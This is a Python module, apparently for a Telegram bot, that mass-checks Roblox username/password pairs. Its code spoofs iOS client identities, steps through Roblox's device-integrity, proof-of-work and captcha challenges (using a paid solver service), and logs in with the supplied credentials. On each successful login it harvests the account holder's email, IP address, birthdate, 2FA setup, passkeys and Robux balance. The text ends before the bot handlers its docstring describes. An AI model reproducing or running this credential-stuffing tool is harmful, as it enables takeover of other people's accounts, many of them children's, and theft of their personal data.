# -*- coding: utf-8 -*-
"""
roblox_handler.py — Roblox Account Checker for Telegram Bot

Features:
  /roblox username|password  (or username:password, multi-line)
  /roblox (reply .txt)       (parse User:/Pass:/Username:/Password: etc.)
  Pure API login via iPhone Hybrid UA (deviceintegrity ladder — no browser window)
  Optional CapSolver/2captcha for FunCaptcha when Roblox escalates (still no window)
  Concurrent workers, full profile+settings probe
"""
from __future__ import annotations

import asyncio
import base64
import html as _html
import io
import json
import logging
import os
import random
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Optional
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

log = logging.getLogger("roblox")

BASE_AUTH = "https://auth.roblox.com"
BASE_APIS = "https://apis.roblox.com"
BASE_WWW  = "https://www.roblox.com"
POW_URL   = f"{BASE_APIS}/proof-of-work-service/v1/pow-puzzle"
CONTINUE_URL = f"{BASE_APIS}/challenge/v1/continue"

ROBLOX_MAX_WORKERS = 20
ROBLOX_OK = True

# Exact iPhone Hybrid UA from ProxyPin HAR + native Roblox variants.
# Each login picks via random.choice(_ua_pool()) — winners of short-path / HAR family.
UA_IPHONE_HYBRID = (
    "Mozilla/5.0 (iPhone; iPhone14,3; CPU iPhone OS 27.0 like Mac OS X) "
    "AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B176 "
    "ROBLOX iOS App 2.730.790 Hybrid RobloxApp/2.730.790 "
    "(GlobalDist; AppleAppStore)"
)
UA_POOL = [
    ("iphone_hybrid_har", UA_IPHONE_HYBRID),
    (
        "roblox_native_ios",
        "Roblox/2.730.790 (iPhone; CPU iPhone OS 18_0 like Mac OS X; Scale/3.00)",
    ),
    (
        "roblox_native_ios_14_3",
        "Roblox/2.730.790 (iPhone14,3; CPU iPhone OS 18_0 like Mac OS X; Scale/3.00)",
    ),
    (
        "roblox_ios_app_plain",
        "ROBLOX iOS App 2.730.790",
    ),
    (
        "roblox_app_store",
        "RobloxApp/2.730.790 (GlobalDist; AppleAppStore)",
    ),
    (
        "iphone_hybrid_2645",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Mobile/15E148 ROBLOX iOS App 2.645.593 Hybrid "
        "RobloxApp/2.645.593 (GlobalDist; AppleAppStore)",
    ),
    (
        "mac_hybrid_old",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Mobile/9B176 ROBLOX iOS App 2.445.410643 Hybrid "
        "RobloxApp/2.445.410643 (GlobalDist; AppleAppStore)",
    ),
]
# Back-compat alias used by captcha / probe headers
UA = UA_IPHONE_HYBRID
ACCEPT_LANG = "en-VN;q=1, id-VN;q=0.9, ru-VN;q=0.8, es-VN;q=0.7, fr-VN;q=0.6, bn-VN;q=0.5"
RBX_DEVICE_HANDLE = "13242619421494011076"

# Optional FunCaptcha solver (CapSolver/2captcha) — pure HTTP only, never opens a window.
# Set via env CAPSOLVER_API_KEY / CAPTCHA_API_KEY, or roblox_init(captcha_api_key=...).
CAPTCHA_SOLVER_KEY = (
    os.getenv("CAPSOLVER_API_KEY")
    or os.getenv("CAPTCHA_API_KEY")
    or os.getenv("TWOCAPTCHA_API_KEY")
    or ""
).strip()

CE_ROBLOX = "5220186290456120696"

# ══════════════════════════════════════════════════════════════
#  Data classes
# ══════════════════════════════════════════════════════════════

@dataclass
class RobloxResult:
    username: str
    password: str
    ok: bool = False
    error: str = ""
    user_id: int = 0
    display_name: str = ""
    description: str = ""
    created: str = ""
    is_banned: bool = False
    has_verified_badge: bool = False
    robux: int = 0
    premium: bool = False
    email: str = ""
    email_verified: bool = False
    phone_verified: bool = False
    country: str = ""
    birthdate: str = ""
    gender: str = ""
    age_group: str = ""
    voice_enabled: bool = False
    voice_verified: bool = False
    friends_count: int = 0
    followers_count: int = 0
    followings_count: int = 0
    friend_requests: int = 0
    groups: list = field(default_factory=list)
    messages_unread: int = 0
    notif_unread: int = 0
    two_fa_enabled: bool = False
    two_fa_methods: list = field(default_factory=list)
    passkeys: list = field(default_factory=list)
    xbox_connected: bool = False
    avatar_url: str = ""
    profile_url: str = ""
    badges_count: int = 0
    ip_address: str = ""
    account_age_days: int = 0
    previous_usernames: str = ""
    can_trade: bool = False
    elapsed: float = 0.0
    login_status: int = 0
    challenge_type: str = ""
    ua_name: str = ""
    ua: str = ""

# ══════════════════════════════════════════════════════════════
#  Low-level helpers (from test_full_probe.py)
# ══════════════════════════════════════════════════════════════

def _safe_json(text: str) -> Any:
    try:
        return json.loads(text)
    except Exception:
        return {}

def _get_h(resp, name: str) -> str:
    for k, v in resp.headers.items():
        if k.lower() == name.lower():
            return v
    return ""

def _der_to_raw(sig_der: bytes) -> bytes:
    r, s = decode_dss_signature(sig_der)
    return r.to_bytes(32, "big") + s.to_bytes(32, "big")

class _TimeLockSolver:
    def __init__(self, N: int, A: int, T: int):
        self.N, self.A, self.T = N, A, T
    def run(self) -> str:
        b = self.A
        for _ in range(self.T):
            b = pow(b, 2, self.N)
        return str(b)

def _ua_pool() -> list[tuple[str, str]]:
    """UA racikan for random.choice. Prefer multi-winner file; else full pool."""
    winners_path = Path(__file__).resolve().parent / "roblox" / "ua_winners.json"
    try:
        if winners_path.is_file():
            data = json.loads(winners_path.read_text(encoding="utf-8"))
            pool = [(x["name"], x["ua"]) for x in data if x.get("ua")]
            # Only trust winners file if it has 2+ entries (real bypass set)
            if len(pool) >= 2:
                return pool
    except Exception:
        pass
    return list(UA_POOL)


def _make_session(ua: str | None = None, ua_name: str | None = None):
    from curl_cffi import requests as creq
    # chrome99_android TLS + random.choice UA each process
    if ua:
        picked_name = ua_name or "custom"
        picked_ua = ua
    else:
        picked_name, picked_ua = random.choice(_ua_pool())
    dh = str(random.randint(10**18, 10**19 - 1))
    s = creq.Session(impersonate="chrome99_android")
    s.headers.update({
        "User-Agent": picked_ua,
        "Accept": "*/*",
        "Accept-Language": ACCEPT_LANG,
        "Accept-Encoding": "gzip, deflate, br",
        "RBX-Device-Handle": dh,
        "Connection": "keep-alive",
    })
    s._rbx_ua_name = picked_name  # type: ignore[attr-defined]
    s._rbx_ua = picked_ua  # type: ignore[attr-defined]
    s._rbx_dh = dh  # type: ignore[attr-defined]
    return s

def _generate_sai(sess, max_retries: int = 3) -> dict:
    for attempt in range(max_retries + 1):
        resp = sess.get(
            f"{BASE_APIS}/hba-service/v1/getServerNonce",
            headers={"Origin": BASE_WWW, "Referer": f"{BASE_WWW}/"},
            timeout=30,
        )
        if resp.status_code == 429:
            if attempt < max_retries:
                time.sleep(2.0 * (attempt + 1))
                continue
            raise RuntimeError("nonce rate-limited (429)")
        nonce = resp.text.strip().strip('"')
        if resp.status_code != 200 or not nonce:
            raise RuntimeError(f"nonce fail {resp.status_code}")
        break
    pk = ec.generate_private_key(ec.SECP256R1())
    pub = base64.b64encode(
        pk.public_key().public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    ).decode()
    ts = int(time.time())
    payload = f"{pub}|{ts}|{nonce}"
    sig = base64.b64encode(_der_to_raw(pk.sign(payload.encode(), ec.ECDSA(hashes.SHA256())))).decode()
    return {"clientPublicKey": pub, "clientEpochTimestamp": ts, "serverNonce": nonce, "saiSignature": sig}

def _get_csrf(sess) -> str:
    """Get CSRF token via lightweight POST (no login attempt needed)."""
    for attempt in range(3):
        resp = sess.post("https://friends.roblox.com/v1/users/1/request-friendship",
            headers={"Content-Type": "application/json;charset=UTF-8", "Origin": BASE_WWW, "Referer": f"{BASE_WWW}/"},
            timeout=15)
        tok = _get_h(resp, "x-csrf-token")
        if tok:
            return tok
        if resp.status_code == 429:
            time.sleep(2.0 * (attempt + 1))
            continue
        break
    raise RuntimeError(f"no csrf {resp.status_code if resp else '?'}")

def _get_cookie(sess, name: str) -> str:
    try:
        v = sess.cookies.get(name)
        if v: return v
    except Exception:
        pass
    try:
        for k, v in dict(sess.cookies).items():
            if k == name: return v
    except Exception:
        pass
    return ""

def _login_headers(csrf: str = "", sess=None) -> dict:
    # Device-Handle / UA live on the session — do not overwrite with globals
    h = {
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": BASE_WWW,
        "Referer": f"{BASE_WWW}/login",
    }
    if sess is not None:
        dh = getattr(sess, "_rbx_dh", None) or sess.headers.get("RBX-Device-Handle")
        if dh:
            h["RBX-Device-Handle"] = dh
        ua = getattr(sess, "_rbx_ua", None) or sess.headers.get("User-Agent")
        if ua:
            h["User-Agent"] = ua
    else:
        h["RBX-Device-Handle"] = RBX_DEVICE_HANDLE
    if csrf:
        h["x-csrf-token"] = csrf
    return h


def _continue_challenge(sess, csrf: str, challenge_id: str, challenge_type: str, meta) -> dict:
    meta_s = meta if isinstance(meta, str) else json.dumps(meta, separators=(",", ":"))
    resp = sess.post(
        CONTINUE_URL,
        json={
            "challengeId": challenge_id,
            "challengeType": challenge_type,
            "challengeMetadata": meta_s,
        },
        headers=_login_headers(csrf, sess),
        timeout=30,
    )
    if resp.status_code not in (200, 201):
        raise RuntimeError(f"continue {challenge_type} {resp.status_code}")
    body = _safe_json(resp.text)
    return body if isinstance(body, dict) else {}


def _solve_pow_session(sess, csrf: str, session_id: str) -> dict:
    resp = sess.get(
        POW_URL,
        params={"sessionID": session_id},
        headers={"Origin": BASE_WWW, "Referer": f"{BASE_WWW}/"},
        timeout=30,
    )
    if resp.status_code != 200:
        raise RuntimeError(f"pow get {resp.status_code}")
    puzzle = _safe_json(resp.text)
    art = puzzle.get("artifacts")
    art = json.loads(art) if isinstance(art, str) else (art or {})
    solution = _TimeLockSolver(int(art["N"]), int(art["A"]), int(art["T"])).run()
    resp = sess.post(
        POW_URL,
        json={"sessionID": session_id, "solution": solution},
        headers={
            "Content-Type": "application/json",
            "Origin": BASE_WWW,
            "Referer": f"{BASE_WWW}/",
            "x-csrf-token": csrf,
        },
        timeout=60,
    )
    if resp.status_code != 200:
        raise RuntimeError(f"pow post {resp.status_code}")
    verify = _safe_json(resp.text)
    if not isinstance(verify, dict) or not verify.get("answerCorrect"):
        raise RuntimeError(f"pow rejected: {verify}")
    return verify


def _login_retry(
    sess,
    csrf: str,
    username: str,
    password: str,
    sai_fallback: dict,
    outer_cid: str,
    candidates: list,
):
    """Try login retry variants. Returns (resp, csrf, ok_bool)."""
    try:
        sai2 = _generate_sai(sess)
    except Exception:
        sai2 = sai_fallback
    body2 = {
        "ctype": "Username",
        "cvalue": username,
        "password": password,
        "secureAuthenticationIntent": sai2,
    }
    last_resp = None
    for _label, chtype, mb in candidates:
        last_resp = sess.post(
            f"{BASE_AUTH}/v2/login",
            json=body2,
            headers={
                **_login_headers(csrf, sess),
                "rblx-challenge-id": outer_cid,
                "rblx-challenge-type": chtype,
                "rblx-challenge-metadata": mb,
            },
            timeout=30,
        )
        new_csrf = _get_h(last_resp, "x-csrf-token")
        if new_csrf:
            csrf = new_csrf
        if last_resp.status_code == 200:
            return last_resp, csrf, True
        if last_resp.status_code == 429:
            return last_resp, csrf, False
    return last_resp, csrf, False


def _do_login(sess, username: str, password: str) -> tuple:
    """
    Pure API login (iOS Hybrid UA) — NEVER opens a browser window.

    Short path (preferred, no FunCaptcha):
      login → deviceintegrity → continue → (empty) →
      retry with rblx-challenge-type=proofofwork + original DI meta → 200

    After DI/PAT/PoW, try early login retry before escalating to FunCaptcha.

    Returns (resp, csrf, error_str_or_None).
    """
    h0 = _login_headers(sess=sess)
    try:
        resp = sess.post(f"{BASE_AUTH}/v2/login", json={}, headers=h0, timeout=20)
        csrf = _get_h(resp, "x-csrf-token")
        if not csrf:
            csrf = _get_csrf(sess)
    except Exception as e:
        return None, "", f"CSRF: {e}"

    try:
        sai = _generate_sai(sess)
    except Exception as e:
        return None, csrf, str(e)

    body = {
        "ctype": "Username",
        "cvalue": username,
        "password": password,
        "secureAuthenticationIntent": sai,
    }
    resp = sess.post(f"{BASE_AUTH}/v2/login", json=body, headers=_login_headers(csrf, sess), timeout=30)
    if resp.status_code == 429:
        return resp, csrf, "Login rate-limited (429)"
    csrf = _get_h(resp, "x-csrf-token") or csrf

    if resp.status_code == 200:
        return resp, csrf, None

    data0 = _safe_json(resp.text)
    if resp.status_code in (401, 400) or (
        isinstance(data0, dict)
        and data0.get("errors")
        and not _get_h(resp, "rblx-challenge-type")
    ):
        err_msg = ""
        if isinstance(data0, dict) and data0.get("errors"):
            err_msg = data0["errors"][0].get("message", "")
        return resp, csrf, err_msg or f"Login failed ({resp.status_code})"

    ctype = (_get_h(resp, "rblx-challenge-type") or "").lower()
    if resp.status_code != 403 or not ctype:
        err_msg = ""
        if isinstance(data0, dict) and data0.get("errors"):
            err_msg = data0["errors"][0].get("message", "")
        return resp, csrf, err_msg or f"Login failed ({resp.status_code})"

    outer_cid = _get_h(resp, "rblx-challenge-id")
    meta_b64 = _get_h(resp, "rblx-challenge-metadata")
    try:
        meta = json.loads(base64.b64decode(meta_b64).decode())
    except Exception as e:
        return resp, csrf, f"bad challenge meta: {e}"

    original_meta_b64 = meta_b64
    pow_cont_meta = None
    captcha_retry_meta = None
    path = [ctype]
    early_candidates = [
        ("original_as_pow", "proofofwork", original_meta_b64),
        ("original_as_di", "deviceintegrity", original_meta_b64),
    ]

    try:
        for _ in range(10):
            if not ctype:
                break

            if ctype == "deviceintegrity":
                cont = _continue_challenge(sess, csrf, outer_cid, "deviceintegrity", meta)
                ctype = (cont.get("challengeType") or "").lower()
                path.append(ctype or "(empty)")
                if cont.get("challengeMetadata"):
                    try:
                        meta = json.loads(cont["challengeMetadata"])
                    except Exception:
                        pass
                # Short-path quirk: after DI, try login BEFORE walking PAT/PoW/captcha
                if ctype in ("", "privateaccesstoken", "proofofwork", "captcha"):
                    rr, csrf, ok = _login_retry(
                        sess, csrf, username, password, sai, outer_cid, early_candidates
                    )
                    if ok:
                        log.info("Early login OK for %s path=%s", username, "→".join(path))
                        return rr, csrf, None
                    if rr is not None and rr.status_code == 429:
                        return rr, csrf, "Login rate-limited (429)"
                    if not ctype:
                        break
                continue

            if ctype == "privateaccesstoken":
                cont = _continue_challenge(sess, csrf, outer_cid, "privateaccesstoken", meta)
                ctype = (cont.get("challengeType") or "").lower()
                path.append(ctype or "(empty)")
                if cont.get("challengeMetadata"):
                    try:
                        meta = json.loads(cont["challengeMetadata"])
                    except Exception:
                        pass
                if ctype in ("", "proofofwork", "captcha"):
                    rr, csrf, ok = _login_retry(
                        sess, csrf, username, password, sai, outer_cid, early_candidates
                    )
                    if ok:
                        log.info("Post-PAT login OK for %s path=%s", username, "→".join(path))
                        return rr, csrf, None
                    if rr is not None and rr.status_code == 429:
                        return rr, csrf, "Login rate-limited (429)"
                    if not ctype:
                        break
                continue

            if ctype == "proofofwork":
                sid = meta.get("sessionId") or meta.get("sessionID")
                verify = _solve_pow_session(sess, csrf, sid)
                pow_cont_meta = {
                    "sessionId": sid,
                    "redemptionToken": verify.get("redemptionToken", ""),
                }
                for k in ("requestPath", "requestMethod"):
                    if k in meta:
                        pow_cont_meta[k] = meta[k]
                cont = _continue_challenge(sess, csrf, outer_cid, "proofofwork", pow_cont_meta)
                ctype = (cont.get("challengeType") or "").lower()
                path.append(ctype or "(empty)")
                if cont.get("challengeMetadata"):
                    try:
                        meta = json.loads(cont["challengeMetadata"])
                    except Exception:
                        pass
                pow_mb = base64.b64encode(
                    json.dumps(pow_cont_meta, separators=(",", ":")).encode()
                ).decode()
                mid_cands = [
                    ("pow_redemption", "proofofwork", pow_mb),
                    ("original_as_pow", "proofofwork", original_meta_b64),
                ]
                if ctype in ("", "captcha"):
                    rr, csrf, ok = _login_retry(
                        sess, csrf, username, password, sai, outer_cid, mid_cands
                    )
                    if ok:
                        log.info("Post-PoW login OK for %s path=%s", username, "→".join(path))
                        return rr, csrf, None
                    if rr is not None and rr.status_code == 429:
                        return rr, csrf, "Login rate-limited (429)"
                    if not ctype:
                        break
                continue

            if ctype == "captcha":
                path_s = "→".join(path)
                log.info(
                    "Captcha ladder for %s path=%s — pure Arkose API (no window)",
                    username,
                    path_s,
                )
                blob = meta.get("dataExchangeBlob") or ""
                unified = meta.get("unifiedCaptchaId") or outer_cid
                if not blob:
                    return resp, csrf, f"CAPTCHA_REQUIRED|{path_s}|no_blob"
                token, terr = _solve_roblox_captcha_api(sess, blob)
                if not token:
                    return resp, csrf, f"CAPTCHA_REQUIRED|{path_s}|{terr or 'arkose_fail'}"
                cap_meta = {
                    "unifiedCaptchaId": unified,
                    "captchaToken": token,
                    "actionType": "Login",
                }
                cont = _continue_challenge(sess, csrf, outer_cid, "captcha", cap_meta)
                ctype = (cont.get("challengeType") or "").lower()
                path.append(ctype or "(empty)")
                captcha_retry_meta = cap_meta
                if cont.get("challengeMetadata"):
                    try:
                        meta = json.loads(cont["challengeMetadata"])
                    except Exception:
                        pass
                continue

            return resp, csrf, f"Unknown challenge: {ctype}"
    except Exception as e:
        return resp, csrf, f"Challenge ladder: {e}"

    candidates = [
        ("original_as_pow", "proofofwork", original_meta_b64),
    ]
    if captcha_retry_meta:
        candidates.insert(
            0,
            (
                "captcha_token_as_pow",
                "proofofwork",
                base64.b64encode(
                    json.dumps(captcha_retry_meta, separators=(",", ":")).encode()
                ).decode(),
            ),
        )
    if pow_cont_meta:
        candidates.append(
            (
                "pow_redemption",
                "proofofwork",
                base64.b64encode(
                    json.dumps(pow_cont_meta, separators=(",", ":")).encode()
                ).decode(),
            )
        )
    candidates.append(("original_as_di", "deviceintegrity", original_meta_b64))

    last_resp, csrf, ok = _login_retry(
        sess, csrf, username, password, sai, outer_cid, candidates
    )
    if ok:
        return last_resp, csrf, None
    if last_resp is not None and last_resp.status_code == 429:
        return last_resp, csrf, "Login rate-limited (429)"

    data = _safe_json(last_resp.text) if last_resp is not None else {}
    err_msg = ""
    if isinstance(data, dict) and data.get("errors"):
        err_msg = data["errors"][0].get("message", "")
    ctype_final = (_get_h(last_resp, "rblx-challenge-type") or "").lower() if last_resp else ""
    if ctype_final == "captcha":
        return last_resp, csrf, f"CAPTCHA_REQUIRED|{'→'.join(path)}→captcha"
    if err_msg and "incorrect" in err_msg.lower():
        return last_resp, csrf, err_msg
    return (
        last_resp,
        csrf,
        err_msg
        or f"Login failed ({getattr(last_resp, 'status_code', '?')}) path={'→'.join(path)}",
    )

def _solve_roblox_captcha_api(sess, blob: str) -> tuple[str, str]:
    """Pure HTTP Arkose token — never opens a browser window.

    CapSolver/2captcha if CAPTCHA_SOLVER_KEY set; else local gt2 (suppressed only).
    Visual FunCaptcha tanpa solver key → clear error (NopeCHA recognition != token API).
    """
    solver_key = (
        CAPTCHA_SOLVER_KEY
        or os.getenv("CAPSOLVER_API_KEY")
        or os.getenv("CAPTCHA_API_KEY")
        or os.getenv("TWOCAPTCHA_API_KEY")
        or ""
    ).strip()
    if solver_key:
        tok, err = _capsolver_funcaptcha(blob, solver_key)
        if tok:
            return tok, ""
        log.warning("CapSolver failed: %s — trying local Arkose", err)

    try:
        from roblox._arkose_pure import arkose_token_from_blob
    except ImportError:
        try:
            import importlib.util
            p = os.path.join(os.path.dirname(__file__), "roblox", "_arkose_pure.py")
            spec = importlib.util.spec_from_file_location("arkose_pure", p)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            arkose_token_from_blob = mod.arkose_token_from_blob
        except Exception as e:
            return "", f"arkose module: {e}"

    sess_ua = getattr(sess, "_rbx_ua", None) or sess.headers.get("User-Agent") or UA
    tok, err = arkose_token_from_blob(sess, blob, sess_ua)
    if tok:
        return tok, ""
    if not solver_key:
        return "", (
            (err or "visual FunCaptcha")
            + " | set CAPSOLVER_API_KEY / CAPTCHA_API_KEY for pure-API solve (no window)"
        )
    return "", err or "arkose_fail"


def _capsolver_funcaptcha(blob: str, api_key: str) -> tuple[str, str]:
    """CapSolver FunCaptchaTaskProxyLess — returns (token, error)."""
    try:
        from curl_cffi import requests as creq
        s = creq.Session()
        r = s.post(
            "https://api.capsolver.com/createTask",
            json={
                "clientKey": api_key,
                "task": {
                    "type": "FunCaptchaTaskProxyLess",
                    "websiteURL": "https://www.roblox.com/login",
                    "websitePublicKey": "476068BF-9607-4799-B53D-966BE98E2B81",
                    "data": json.dumps({"blob": blob}),
                    "funcaptchaApiJSSubdomain": "https://arkoselabs.roblox.com",
                },
            },
            timeout=30,
        )
        data = r.json()
        tid = data.get("taskId")
        if not tid:
            return "", str(data)[:200]
        for _ in range(60):
            time.sleep(2)
            r2 = s.post(
                "https://api.capsolver.com/getTaskResult",
                json={"clientKey": api_key, "taskId": tid},
                timeout=30,
            )
            d2 = r2.json()
            if d2.get("status") == "ready":
                tok = (d2.get("solution") or {}).get("token") or ""
                return tok, ("" if tok else "empty token")
            if d2.get("status") == "failed" or d2.get("errorId"):
                return "", str(d2)[:200]
        return "", "capsolver timeout"
    except Exception as e:
        return "", str(e)[:200]


# ══════════════════════════════════════════════════════════════
#  Login + Probe
# ══════════════════════════════════════════════════════════════

def _api_get(sess, url, headers, timeout=15):
    try:
        resp = sess.get(url, headers=headers, timeout=timeout)
        tok = _get_h(resp, "x-csrf-token")
        if tok:
            headers["x-csrf-token"] = tok
            if resp.status_code == 403 and "Token Validation Failed" in (resp.text or ""):
                resp = sess.get(url, headers=headers, timeout=timeout)
        return _safe_json(resp.text) if resp.status_code == 200 else {}
    except Exception:
        return {}

def _api_post(sess, url, body, headers, timeout=15):
    try:
        h = {**headers, "Content-Type": "application/json"}
        resp = sess.post(url, json=body, headers=h, timeout=timeout)
        tok = _get_h(resp, "x-csrf-token")
        if tok:
            headers["x-csrf-token"] = tok
            if resp.status_code == 403 and "Token Validation Failed" in (resp.text or ""):
                resp = sess.post(url, json=body, headers={**headers, "Content-Type": "application/json"}, timeout=timeout)
        return _safe_json(resp.text) if resp.status_code == 200 else {}
    except Exception:
        return {}


def check_single_account(username: str, password: str, max_retries: int = 2) -> RobloxResult:
    """Login + probe. Pure API only (random.choice UA pool + Arkose HTTP, no browser window)."""
    t0 = time.time()
    r = RobloxResult(username=username, password=password)
    try:
        sess = _make_session()
        r.ua_name = getattr(sess, "_rbx_ua_name", "") or ""
        r.ua = getattr(sess, "_rbx_ua", "") or sess.headers.get("User-Agent", "")
        sess.get(f"{BASE_AUTH}/v2/metadata",
            headers={"Origin": BASE_WWW, "Referer": f"{BASE_WWW}/"}, timeout=20)

        resp, csrf = None, ""
        last_err = ""
        for attempt in range(max_retries + 1):
            if attempt > 0:
                time.sleep(2.0 * attempt)
                sess = _make_session()
                r.ua_name = getattr(sess, "_rbx_ua_name", "") or ""
                r.ua = getattr(sess, "_rbx_ua", "") or sess.headers.get("User-Agent", "")
                sess.get(f"{BASE_AUTH}/v2/metadata",
                    headers={"Origin": BASE_WWW, "Referer": f"{BASE_WWW}/"}, timeout=20)
            resp, csrf, err = _do_login(sess, username, password)
            if err:
                last_err = err
                if "429" in err:
                    continue
                break
            if resp is None:
                last_err = "No response"
                continue
            if resp.status_code == 200:
                break
            if resp.status_code == 429 and attempt < max_retries:
                last_err = "Rate limited (429)"
                continue
            data_check = _safe_json(resp.text)
            if isinstance(data_check, dict) and data_check.get("errors"):
                last_err = data_check["errors"][0].get("message", "") or last_err
            break

        if resp is None:
            r.error = last_err or "Login failed"
            r.elapsed = time.time() - t0
            return r

        r.login_status = resp.status_code
        ctype = _get_h(resp, "rblx-challenge-type")
        data = _safe_json(resp.text)
        roblo = _get_cookie(sess, ".ROBLOSECURITY")
        user = data.get("user") if isinstance(data, dict) else None

        if resp.status_code != 200 or not roblo or not isinstance(user, dict):
            err_msg = last_err or ""
            if not err_msg:
                if isinstance(data, dict) and data.get("errors"):
                    err_msg = data["errors"][0].get("message", "")
                elif isinstance(data, dict) and data.get("message"):
                    err_msg = data["message"]
            if err_msg.startswith("CAPTCHA_REQUIRED|"):
                err_msg = "Captcha: " + err_msg.split("|", 1)[1]
            r.challenge_type = ctype or ("captcha" if "Captcha" in err_msg or "CAPTCHA" in (last_err or "") else "")
            r.error = err_msg or f"Login failed ({resp.status_code})"
            r.elapsed = time.time() - t0
            return r

        r.ok = True
        r.user_id = user.get("id", 0)
        r.display_name = user.get("displayName", "")
        r.challenge_type = f"ios-api/{r.ua_name or 'ua'}"

        uid = str(r.user_id)
        r.profile_url = f"{BASE_WWW}/users/{uid}/profile"

        sess_ua = getattr(sess, "_rbx_ua", None) or UA
        hdrs = {"Origin": BASE_WWW, "Referer": f"{BASE_WWW}/my/account", "x-csrf-token": csrf, "User-Agent": sess_ua}
        _probe_account(sess, r, uid, hdrs)

    except Exception as e:
        r.error = str(e)[:200]
    r.elapsed = time.time() - t0
    return r


def _probe_account(sess, r: RobloxResult, uid: str, hdrs: dict) -> None:
    """Fill RobloxResult fields from authenticated APIs."""
    settings = _api_get(sess, f"{BASE_WWW}/my/settings/json", hdrs, timeout=20)
    if settings:
        r.email = settings.get("UserEmail") or ""
        r.email_verified = bool(settings.get("IsEmailVerified"))
        r.premium = bool(settings.get("IsPremium"))
        r.ip_address = settings.get("ClientIpAddress", "")
        r.account_age_days = settings.get("AccountAgeInDays", 0)
        r.previous_usernames = settings.get("PreviousUserNames", "")
        r.can_trade = bool(settings.get("CanTrade"))

    emails = _api_get(sess, "https://accountsettings.roblox.com/v1/emails", hdrs)
    if emails and not r.email:
        r.email = emails.get("verifiedEmail") or emails.get("pendingEmail") or ""
        r.email_verified = bool(emails.get("verifiedEmail"))

    phone = _api_get(sess, "https://accountinformation.roblox.com/v1/phone", hdrs)
    if phone:
        r.phone_verified = bool(phone.get("isVerified"))

    country = _api_get(sess, "https://accountsettings.roblox.com/v1/account/settings/account-country", hdrs)
    if country and isinstance(country.get("value"), dict):
        r.country = country["value"].get("localizedName") or country["value"].get("countryName") or ""

    bdate = _api_get(sess, "https://users.roblox.com/v1/birthdate", hdrs)
    if bdate and bdate.get("birthYear"):
        r.birthdate = f"{bdate.get('birthYear',0)}-{bdate.get('birthMonth',0):02d}-{bdate.get('birthDay',0):02d}"

    gender_d = _api_get(sess, "https://users.roblox.com/v1/gender", hdrs)
    if gender_d:
        g = gender_d.get("gender", 0)
        r.gender = {1: "Laki-laki", 2: "Perempuan", 3: "Lainnya"}.get(g, "Unknown")

    age_g = _api_get(sess, f"{BASE_APIS}/user-settings-api/v1/account-insights/age-group", hdrs)
    if age_g:
        raw = age_g.get("ageGroupTranslationKey", "")
        r.age_group = raw.replace("Label.AgeGroup", "").replace("Over", ">")

    desc = _api_get(sess, "https://users.roblox.com/v1/description", hdrs)
    if desc:
        r.description = (desc.get("description") or "")[:200]

    voice = _api_get(sess, "https://voice.roblox.com/v1/settings", hdrs)
    if voice:
        r.voice_enabled = bool(voice.get("isVoiceEnabled"))
        r.voice_verified = bool(voice.get("isVerifiedForVoice"))

    user_info = _api_get(sess, f"https://users.roblox.com/v1/users/{uid}", hdrs)
    if user_info:
        r.is_banned = bool(user_info.get("isBanned"))
        r.has_verified_badge = bool(user_info.get("hasVerifiedBadge"))
        r.created = (user_info.get("created") or "")[:10]
        if not r.display_name:
            r.display_name = user_info.get("displayName", "")
        if not r.description:
            r.description = (user_info.get("description") or "")[:200]

    currency = _api_get(sess, f"https://economy.roblox.com/v1/users/{uid}/currency", hdrs)
    if currency:
        r.robux = currency.get("robux", 0)

    fc = _api_get(sess, f"https://friends.roblox.com/v1/users/{uid}/friends/count", hdrs)
    if fc:
        r.friends_count = fc.get("count", 0)

    flc = _api_get(sess, f"https://friends.roblox.com/v1/users/{uid}/followers/count", hdrs)
    if flc:
        r.followers_count = flc.get("count", 0)

    foc = _api_get(sess, f"https://friends.roblox.com/v1/users/{uid}/followings/count", hdrs)
    if foc:
        r.followings_count = foc.get("count", 0)

    fr = _api_get(sess, "https://friends.roblox.com/v1/user/friend-requests/count", hdrs)
    if fr:
        r.friend_requests = fr.get("count", 0)

    gr = _api_get(sess, f"https://groups.roblox.com/v1/users/{uid}/groups/roles?includeLocked=true", hdrs)
    if gr and isinstance(gr.get("data"), list):
        r.groups = [g.get("group", {}).get("name", "?") for g in gr["data"][:10]]

    mu = _api_get(sess, "https://privatemessages.roblox.com/v1/messages/unread/count", hdrs)
    if mu:
        r.messages_unread = mu.get("count", 0)

    nu = _api_get(sess, "https://notifications.roblox.com/v2/stream-notifications/unread-count", hdrs)
    if nu:
        r.notif_unread = nu.get("unreadNotifications", 0)

    tfa = _api_get(sess, f"https://twostepverification.roblox.com/v1/users/{uid}/configuration", hdrs)
    if tfa:
        methods = tfa.get("methods") or []
        r.two_fa_methods = [m.get("mediaType", "?") for m in methods if m.get("enabled")]
        r.two_fa_enabled = bool(r.two_fa_methods)

    pk = _api_post(sess, f"{BASE_AUTH}/v1/passkey/ListCredentials", {}, hdrs)
    if pk and isinstance(pk.get("credentials"), list):
        r.passkeys = [c.get("nickname", "?") for c in pk["credentials"]]

    xbox = _api_get(sess, f"{BASE_AUTH}/v1/xbox/connection", hdrs)
    if xbox:
        r.xbox_connected = bool(xbox.get("hasConnectedXboxAccount"))

    thumb = _api_get(
        sess,
        f"https://thumbnails.roblox.com/v1/users/avatar?userIds={uid}&size=150x150&format=Png&isCircular=false",
        hdrs,
    )
    if thumb and isinstance(thumb.get("data"), list) and thumb["data"]:
        r.avatar_url = thumb["data"][0].get("imageUrl", "")

    badges = _api_get(sess, f"https://badges.roblox.com/v1/users/{uid}/badges?limit=10&sortOrder=Asc", hdrs)
    if badges and isinstance(badges.get("data"), list):
        r.badges_count = len(badges["data"])


_login_semaphore = threading.Semaphore(2)

